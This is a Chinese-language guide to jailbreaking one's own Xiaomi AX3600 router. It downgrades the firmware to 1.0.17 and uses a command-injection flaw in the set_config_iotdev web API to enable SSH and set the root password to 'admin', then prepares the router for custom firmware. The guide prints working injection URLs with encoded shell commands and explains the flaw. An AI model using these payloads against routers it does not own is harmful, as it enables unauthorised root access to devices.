# 小米 AX3600 固件降级 + 破解 SSH 步骤

> 目的：原厂固件新版已封堵漏洞，必须先降到 **1.0.17** 再利用 Web API 命令注入漏洞（恩山 LonGDikE 发现，OpenWrt 论坛已验证）打开 SSH。
> 这是刷入 LibWrt/NSS 自制固件的**前置步骤**：拿到 SSH 后才能通过 initramfs → UBI 流程刷入我们云编译的固件。
>
> ⚠️ 全程不要给路由器断电（尤其刷机阶段）；降级会**清除全部配置**（Wi-Fi 名、宽带拨号账号密码等需重设）。
> ⚠️ 降级成功后路由器后台会提示"发现新版本"，**切勿点击升级**，否则漏洞被封需重来。

---

## 需要准备的东西

| 项目 | 说明 |
|---|---|
| 1.0.17 官方固件 | 已下载到本仓库 `firmware/miwifi_r3600_firmware_5da25_1.0.17.bin`（28.3 MB，sha256 `dfbe3473…`）。备用官方直链：`http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin` |
| 电脑（Windows/Mac 均可） | 装好 Putty（或 Windows 终端自带 ssh）和 WinSCP（可选，固化阶段才需要） |
| 网线（可能需要） | 见下方"降级方式二选一"：后台手动降级不需要网线（Wi-Fi 即可）；修复工具强制降级**必须有网线**连路由器 LAN 口 |
| 浏览器 | 用来执行漏洞 URL（地址栏直接访问即可） |

---

## 第一步：降级到 1.0.17（方式二选一）

### 方式 A：后台手动降级（优先尝试，不需要网线）

1. 连上路由器（Wi-Fi 或网线均可），浏览器登录 `192.168.31.1`；
2. 进入 **常用设置 → 系统状态 → 系统升级 → 手动升级**；
3. 选择 `miwifi_r3600_firmware_5da25_1.0.17.bin`，点"开始升级"；
   - **如果提示"无法降级/固件版本过低"** → 说明当前版本较高，后台拒绝降级，走方式 B；
   - 允许降级的旧版后台会直接接受文件，勾选"清除用户配置"确认；
4. 等待 5–8 分钟，路由器自动重启。

### 方式 B：小米路由器修复工具强制降级（后台拒绝时用，需要网线）

1. 电脑用**网线连接路由器 LAN 口**，下载小米官方"路由器修复工具"（小米官网 miwifi.com/download 页提供的 PC 修复客户端）；
2. 打开修复工具 → 选择"本地固件" → 选 1.0.17 bin 文件；
3. 按工具提示操作：**断电 → 按住 Reset 不放 → 通电 → 等 10 秒左右松开**，路由器进入修复模式（指示灯闪烁）；
4. 工具自动通过网线刷写 1.0.17，全程约 5–10 分钟，**期间绝对不能断电**；
5. 完成后路由器重启，恢复出厂状态，重新连接 Wi-Fi 并按向导完成首次设置（此步必须让路由器与电脑处于同一局域网，联网与否均可）。

### 降级后检查

登录后台 `192.168.31.1`，拉到底部"系统状态"确认版本为 **1.0.17**。如后台弹出"发现新版本"提示，直接忽略/关闭，**不要升级**。

---

## 第二步：获取 STOK

1. 浏览器登录路由器后台 `192.168.31.1`；
2. 登录成功后，地址栏会变成：

   ```
   http://192.168.31.1/cgi-bin/luci/;stok=<一串32位十六进制>/web/home#router
   ```

3. 复制 `;stok=` 和下一个 `/` 之间的那串字符（例如 `776655a7c3d2605a2e708b25e4751955`），后面要用。

---

## 第三步：注入命令开启 SSH（两条 URL，浏览器地址栏依次访问）

把下面 URL 里的 `<STOK>` 全部替换成第二步拿到的值，**逐条**粘贴到浏览器地址栏回车：

**① 开启 dropbear（SSH 服务）：**

```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
```

**② 设置 root 密码为 admin：**

```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
```

每条成功都会返回：

```json
{"code":0}
```

> 原理：`set_config_iotdev` 接口的 `ssid` 参数未做过滤，直接拼进 `forkExec("connect -s <ssid> …")`，`-h%3B` 注入换行即可执行任意 shell 命令（1.0.17 的 misystem.lua 为明文 Lua，新版本已编译加密封堵）。
> 如果返回的不是 `{"code":0}`（比如 stok 过期），重新登录后台再取一次 stok 即可。

---

## 第四步：验证 SSH 登录

```
ssh root@192.168.31.1
```

- 密码：`admin`
- Windows 可用 `ssh` 命令或 Putty；出现小米路由器 shell 提示符即成功。

> ⚠️ 此密码仅是破解过程的临时密码，刷入第三方固件后会被新固件的密码体系取代。

---

## 第五步（可选）：固化 SSH（仅为留在原厂固件使用时才需要）

**如果目标就是刷 LibWrt 自制固件，此步可完全跳过**——拿到 SSH 后直接进入 initramfs 刷机流程即可，因为刷机过程中 SSH 一次性使用。

若想长期保留原厂固件并让 SSH 在升级/重启后仍有效（修改 bdata 分区）：

1. 用 WinSCP（SCP 协议，root/admin）把 `mitool_arm64` 传到 `/tmp/`；
2. SSH 里执行：

   ```
   chmod +x /tmp/mitool_arm64
   /tmp/mitool_arm64 unlock      # 解锁 mtd 写保护，执行完会要求重启
   # 重启后重新 SSH 登录，再执行：
   /tmp/mitool_arm64 hack        # 修改 mtd9(bdata)，固化 ssh/telnet
   ```

3. `hack` 会生成并使用由**路由器 SN 计算出的默认密码**，用 `cat /proc/audit/...` 或按 mitool 输出提示获取。

---

## 与刷机方案的衔接

SSH 可用后，按《AX3600_LibWrt_NSS_完整方案.md》继续：

1. 把云编译 Release（Tag `AX3600-Stock`）里的 **initramfs 镜像**（文件名含 `initramfs`）传到路由器 `/tmp/`；
2. `dd` 写入 kernel 分区或用 `sysupgrade` 方式引导 initramfs 后，再刷正式 UBI 固件（具体以方案文档对应章节为准）；
3. 首启注意：CI 定制固件的管理地址是 **http://192.168.2.1**（CI 脚本改过默认 IP），首启 Wi-Fi 为 `AX3600-Setup` / `AX3600-Setup-9pQ7xM2k`。

---

## 风险与回滚

- 降级/注入操作本身不写入固件分区，变砖风险极低；真正有风险的是之后的 UBI 刷写步骤。
- 任何一步出错想重来：路由器断电按 Reset 10 秒恢复出厂 → 重新走"第一步"。
- 修复工具强刷 1.0.17 同样是官方救砖通道，即设备已变砖也可用方式 B 恢复。
